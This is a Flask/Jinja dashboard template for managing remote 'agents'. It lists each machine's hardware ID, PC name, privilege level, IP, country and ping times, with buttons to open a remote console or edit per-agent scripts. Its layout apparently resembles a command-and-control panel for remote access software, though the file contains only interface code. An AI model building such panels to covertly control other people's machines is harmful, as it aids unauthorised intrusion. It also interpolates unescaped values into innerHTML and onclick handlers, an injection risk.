{% extends "base.html" %}

{% block extra_js %}
<script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
<script>
    // Country code to full name mapping
    const countryNames = {
        'DE': 'Germany', 'US': 'United States', 'GB': 'United Kingdom', 'FR': 'France', 
        'CA': 'Canada', 'AU': 'Australia', 'JP': 'Japan', 'CN': 'China', 'KR': 'South Korea', 
        'IN': 'India', 'BR': 'Brazil', 'RU': 'Russia', 'IT': 'Italy', 'ES': 'Spain', 
        'NL': 'Netherlands', 'SE': 'Sweden', 'NO': 'Norway', 'DK': 'Denmark', 'FI': 'Finland', 
        'CH': 'Switzerland', 'AT': 'Austria', 'BE': 'Belgium', 'PL': 'Poland', 'CZ': 'Czech Republic', 
        'HU': 'Hungary', 'RO': 'Romania', 'BG': 'Bulgaria', 'HR': 'Croatia', 'SI': 'Slovenia', 
        'SK': 'Slovakia', 'LT': 'Lithuania', 'LV': 'Latvia', 'EE': 'Estonia', 'IE': 'Ireland', 
        'PT': 'Portugal', 'GR': 'Greece', 'CY': 'Cyprus', 'MT': 'Malta', 'LU': 'Luxembourg', 
        'IS': 'Iceland', 'TR': 'Turkey', 'UA': 'Ukraine', 'BY': 'Belarus', 'MD': 'Moldova', 
        'GE': 'Georgia', 'AM': 'Armenia', 'AZ': 'Azerbaijan', 'KZ': 'Kazakhstan', 'UZ': 'Uzbekistan', 
        'KG': 'Kyrgyzstan', 'TJ': 'Tajikistan', 'TM': 'Turkmenistan', 'AF': 'Afghanistan', 
        'PK': 'Pakistan', 'BD': 'Bangladesh', 'LK': 'Sri Lanka', 'NP': 'Nepal', 'BT': 'Bhutan', 
        'MV': 'Maldives', 'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapore', 'TH': 'Thailand', 
        'VN': 'Vietnam', 'PH': 'Philippines', 'MM': 'Myanmar', 'LA': 'Laos', 'KH': 'Cambodia', 
        'BN': 'Brunei', 'TL': 'East Timor', 'PG': 'Papua New Guinea', 'FJ': 'Fiji', 'NC': 'New Caledonia', 
        'VU': 'Vanuatu', 'SB': 'Solomon Islands', 'KI': 'Kiribati', 'TV': 'Tuvalu', 'NR': 'Nauru', 
        'PW': 'Palau', 'MH': 'Marshall Islands', 'FM': 'Micronesia', 'WS': 'Samoa', 'TO': 'Tonga', 
        'CK': 'Cook Islands', 'NU': 'Niue', 'TK': 'Tokelau', 'NZ': 'New Zealand', 'MX': 'Mexico', 
        'GT': 'Guatemala', 'BZ': 'Belize', 'SV': 'El Salvador', 'HN': 'Honduras', 'NI': 'Nicaragua', 
        'CR': 'Costa Rica', 'PA': 'Panama', 'CO': 'Colombia', 'VE': 'Venezuela', 'GY': 'Guyana', 
        'SR': 'Suriname', 'GF': 'French Guiana', 'EC': 'Ecuador', 'PE': 'Peru', 'BO': 'Bolivia', 
        'CL': 'Chile', 'AR': 'Argentina', 'PY': 'Paraguay', 'UY': 'Uruguay', 'ZA': 'South Africa', 
        'NA': 'Namibia', 'BW': 'Botswana', 'ZW': 'Zimbabwe', 'ZM': 'Zambia', 'MW': 'Malawi', 
        'MZ': 'Mozambique', 'TZ': 'Tanzania', 'KE': 'Kenya', 'UG': 'Uganda', 'RW': 'Rwanda', 
        'BI': 'Burundi', 'CD': 'DR Congo', 'CG': 'Republic of Congo', 'GA': 'Gabon', 'GQ': 'Equatorial Guinea', 
        'CM': 'Cameroon', 'CF': 'Central African Republic', 'TD': 'Chad', 'NE': 'Niger', 'NG': 'Nigeria', 
        'BJ': 'Benin', 'TG': 'Togo', 'GH': 'Ghana', 'CI': 'Ivory Coast', 'LR': 'Liberia', 'SL': 'Sierra Leone', 
        'GN': 'Guinea', 'GW': 'Guinea-Bissau', 'SN': 'Senegal', 'GM': 'Gambia', 'CV': 'Cape Verde', 
        'MR': 'Mauritania', 'ML': 'Mali', 'BF': 'Burkina Faso', 'DZ': 'Algeria', 'TN': 'Tunisia', 
        'LY': 'Libya', 'EG': 'Egypt', 'SD': 'Sudan', 'SS': 'South Sudan', 'ET': 'Ethiopia', 
        'ER': 'Eritrea', 'DJ': 'Djibouti', 'SO': 'Somalia', 'KM': 'Comoros', 'YT': 'Mayotte', 
        'RE': 'Réunion', 'MU': 'Mauritius', 'SC': 'Seychelles', 'MG': 'Madagascar', 'MA': 'Morocco'
    };

    // Update all country flags on page load
    function updateCountryFlags() {
        // Prevent multiple calls
        if (window.flagsUpdated) return;
        
        const countryElements = document.querySelectorAll('.country-flag');
        
        let updatedCount = 0;
        countryElements.forEach(element => {
            const countryCode = element.getAttribute('data-country');
            const flagImage = element.querySelector('.flag-image');
            const countryNameSpan = element.querySelector('.country-name-text');
            
            if (flagImage && countryCode) {
                // Set the PNG flag image source
                flagImage.src = `/static/images/flags/${countryCode.toLowerCase()}.png`;
                flagImage.alt = `${countryCode} flag`;
                
                // Update the country name
                if (countryNameSpan) {
                    const fullName = countryNames[countryCode] || countryCode;
                    countryNameSpan.textContent = `(${fullName})`;
                }
                
                updatedCount++;
            }
        });
        
        if (updatedCount > 0) {
            window.flagsUpdated = true;
        }
    }

    // Update flags when DOM is loaded
    document.addEventListener('DOMContentLoaded', updateCountryFlags);
    
    // Also try to update immediately in case DOM is already loaded
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', updateCountryFlags);
    } else {
        // DOM is already loaded, update immediately
        updateCountryFlags();
    }
    
    // Single fallback after a short delay
    setTimeout(updateCountryFlags, 100);
    
    // Also try when window is fully loaded
    window.addEventListener('load', updateCountryFlags);
    
    // handle user deletion in the UI
    function deleteUser(userId, pcname) {
        // Show confirmation modal first
        const confirmModal = new bootstrap.Modal(document.getElementById('deleteConfirmModal'));
        const confirmText = document.getElementById('deleteConfirmText');
        const confirmUserId = document.getElementById('deleteConfirmUserId');
        
        confirmText.textContent = `Are you sure you want to remove agent "${pcname}"?`;
        confirmUserId.value = userId;
        confirmModal.show();
    }
    
    // Function to actually perform the deletion after confirmation
    function confirmDeleteUser() {
        const userId = document.getElementById('deleteConfirmUserId').value;
        const pcname = document.getElementById('deleteConfirmText').textContent.match(/"([^"]+)"/)?.[1] || 'Unknown';
        
        // Hide the modal
        const confirmModal = bootstrap.Modal.getInstance(document.getElementById('deleteConfirmModal'));
        confirmModal.hide();
        
        // Perform the actual deletion
        fetch(`/delete_user/${userId}`, {
            method: 'POST',
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                const userRow = document.getElementById(`user-row-${userId}`);
                if (userRow) {
                    userRow.remove();
                }
                
                const alertBox = document.createElement('div');
                alertBox.className = 'alert alert-success alert-dismissible fade show';
                alertBox.innerHTML = `
                    <strong>Success!</strong> ${data.message}
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                `;
                document.querySelector('.table-container').before(alertBox);
                
                setTimeout(() => {
                    alertBox.remove();
                }, 3000);
            } else {
                const alertBox = document.createElement('div');
                alertBox.className = 'alert alert-danger alert-dismissible fade show';
                alertBox.innerHTML = `
                    <strong>Error!</strong> ${data.message}
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                `;
                document.querySelector('.table-container').before(alertBox);
                
                setTimeout(() => {
                    alertBox.remove();
                }, 3000);
            }
        })
        .catch(error => {
            console.error('Error deleting user:', error);
            const alertBox = document.createElement('div');
            alertBox.className = 'alert alert-danger alert-dismissible fade show';
            alertBox.innerHTML = `
                <strong>Error!</strong> An error occurred while deleting the user
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            `;
            document.querySelector('.table-container').before(alertBox);
            
            setTimeout(() => {
                alertBox.remove();
            }, 3000);
        });
    }
</script>
{% endblock %}

{% block content %}
<div class="container-fluid d-flex flex-column p-0 pt-2">
    <!-- Statistics Cards -->
    {% with include_disk=True, include_active_users=True %}
        {% include 'components/stats_cards.html' %}
    {% endwith %}

    <!-- Users Table Card -->
    <div class="row flex-grow-1">
        <div class="col-12">
            <div class="glass p-4 d-flex flex-column h-100">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <h2 class="welcome-text">Users</h2>
                    <form id="userSearchForm" class="d-flex search-container">
                        <input type="text" id="userSearchInput" name="search" class="form-control form-control-sm search-input" placeholder="Search users..." value="{{ search_term or '' }}">
                        <button type="submit" class="btn btn-sm search-btn">
                            <i class="fas fa-search"></i> Search
                        </button>
                    </form>
                </div>
                <div class="table-responsive flex-grow-1 table-container">
                    <table class="table table-borderless">
                        <thead>
                            <tr>
                                <th class="sortable" onclick="sortTable('id')">
                                    ID
                                    {% if current_sort == 'id' %}
                                        <span class="sort-icon">
                                            {% if current_order == 'asc' %}↑{% else %}↓{% endif %}
                                        </span>
                                    {% endif %}
                                </th>
                                <th class="sortable" onclick="sortTable('hwid')">
                                    HWID
                                    {% if current_sort == 'hwid' %}
                                        <span class="sort-icon">
                                            {% if current_order == 'asc' %}↑{% else %}↓{% endif %}
                                        </span>
                                    {% endif %}
                                </th>
                                <th class="sortable" onclick="sortTable('pcname')">
                                    PC Name
                                    {% if current_sort == 'pcname' %}
                                        <span class="sort-icon">
                                            {% if current_order == 'asc' %}↑{% else %}↓{% endif %}
                                        </span>
                                    {% endif %}
                                </th>
                                <th class="sortable" onclick="sortTable('elevated_status')">
                                    Elevated Status
                                    {% if current_sort == 'elevated_status' %}
                                        <span class="sort-icon">
                                            {% if current_order == 'asc' %}↑{% else %}↓{% endif %}
                                        </span>
                                    {% endif %}
                                </th>
                                <th class="sortable" onclick="sortTable('ip_address')">
                                    IP Address
                                    {% if current_sort == 'ip_address' %}
                                        <span class="sort-icon">
                                            {% if current_order == 'asc' %}↑{% else %}↓{% endif %}
                                        </span>
                                    {% endif %}
                                </th>
                                <th class="sortable" onclick="sortTable('country')">
                                    Country
                                    {% if current_sort == 'country' %}
                                        <span class="sort-icon">
                                            {% if current_order == 'asc' %}↑{% else %}↓{% endif %}
                                        </span>
                                    {% endif %}
                                </th>
                                <th class="sortable" onclick="sortTable('is_active')">
                                    Activity
                                    {% if current_sort == 'is_active' %}
                                        <span class="sort-icon">
                                            {% if current_order == 'asc' %}↑{% else %}↓{% endif %}
                                        </span>
                                    {% endif %}
                                </th>
                                <th class="sortable" onclick="sortTable('last_ping')">
                                    Last Ping
                                    {% if current_sort == 'last_ping' %}
                                        <span class="sort-icon">
                                            {% if current_order == 'asc' %}↑{% else %}↓{% endif %}
                                        </span>
                                    {% endif %}
                                </th>
                                <th class="sortable" onclick="sortTable('first_ping')">
                                    First Seen
                                    {% if current_sort == 'first_ping' %}
                                        <span class="sort-icon">
                                            {% if current_order == 'asc' %}↑{% else %}↓{% endif %}
                                        </span>
                                    {% endif %}
                                </th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for user in users %}
                            <tr id="user-row-{{ user.id }}">
                                <td><span class="badge bg-dark">{{ user.id }}</span></td>
                                <td><span class="text-secondary">{{ user.hwid }}</span></td>
                                <td><span class="text-secondary">{{ user.pcname }}</span></td>
                                <td>
                                    {% if user.elevated_status == 'System' %}
                                        <span class="badge bg-danger elevated-status-badge">System</span>
                                    {% elif user.elevated_status == 'Admin' %}
                                        <span class="badge bg-warning elevated-status-badge">Admin</span>
                                    {% elif user.elevated_status == 'PowerUser' %}
                                        <span class="badge bg-info elevated-status-badge">PowerUser</span>
                                    {% elif user.elevated_status == 'Elevated' %}
                                        <span class="badge bg-primary elevated-status-badge">Elevated</span>
                                    {% elif user.elevated_status == 'User' %}
                                        <span class="badge bg-secondary elevated-status-badge">User</span>
                                    {% else %}
                                        <span class="badge bg-light text-dark elevated-status-badge">{{ user.elevated_status or 'Unknown' }}</span>
                                    {% endif %}
                                </td>
                                <td><span class="text-info">{{ user.ip_address }}</span></td>
                                <td class="country-name">
                                    <div class="country-flag" data-country="{{ user.country }}">
                                        <img src="{{ url_for('static', filename='images/flags/' + user.country.lower() + '.png') }}" 
                                             alt="{{ user.country }} flag" 
                                             class="flag-image"
                                             onerror="this.style.display='none'; this.nextElementSibling.style.display='inline';">
                                        <span class="country-name-text">({{ user.country }})</span>
                                    </div>
                                </td>
                                <td>
                                    <div class="d-flex align-items-center">
                                        <span class="activity-indicator {% if user.is_active %}active{% else %}inactive{% endif %}"></span>
                                        <span class="{% if user.is_active %}text-success{% else %}text-danger{% endif %}">
                                            {{ "Active" if user.is_active else "Inactive" }}
                                        </span>
                                    </div>
                                </td>
                                <td title="{{ user.last_ping }}">
                                    <span class="text-warning">{{ user.last_ping_formatted }}</span>
                                </td>
                                <td title="{{ user.first_ping }}">
                                    <span class="text-secondary">{{ user.first_ping_formatted }}</span>
                                </td>
                                <td>
                                    <button class="btn-action console" title="Open Console" onclick="openConsole('{{ user.id }}', '{{ user.pcname }}')">
                                        <i class="fas fa-terminal"></i>
                                    </button>
                                    <a href="{{ url_for('script.user_scripts', user_id=user.id) }}" class="btn-action edit" title="Edit User Scripts">
                                        <i class="fas fa-edit"></i>
                                    </a>
                                    <button class="btn-action delete" title="Delete User" onclick="deleteUser('{{ user.id }}', '{{ user.pcname }} {{ user.hwid }}')">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
                
                <!-- Pagination -->
                {% include 'components/pagination.html' %}
            </div>
        </div>
    </div>
</div>

<!-- WebSocket Connection -->
{% include 'components/websocket_connection.html' %}

<!-- Console Modal -->
{% include 'scripts/console_modal.html' %}

<!-- Delete Confirmation Modal -->
<div class="modal fade" id="deleteConfirmModal" tabindex="-1" aria-labelledby="deleteConfirmModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="deleteConfirmModalLabel">
                    <i class="fas fa-exclamation-triangle text-warning me-2"></i>
                    Confirm Agent Removal
                </h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <p class="mb-0" id="deleteConfirmText">
                    Are you sure you want to remove this agent?
                </p>
                <input type="hidden" id="deleteConfirmUserId" value="">
                <div class="alert alert-warning mt-3">
                    <i class="fas fa-info-circle me-2"></i>
                    <strong>Warning:</strong> This action cannot be undone. The agent will be permanently removed from the system.
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">
                    <i class="fas fa-times me-2"></i>
                    Cancel
                </button>
                <button type="button" class="btn btn-danger" onclick="confirmDeleteUser()">
                    <i class="fas fa-trash me-2"></i>
                    Remove Agent
                </button>
            </div>
        </div>
    </div>
</div>
{% endblock %}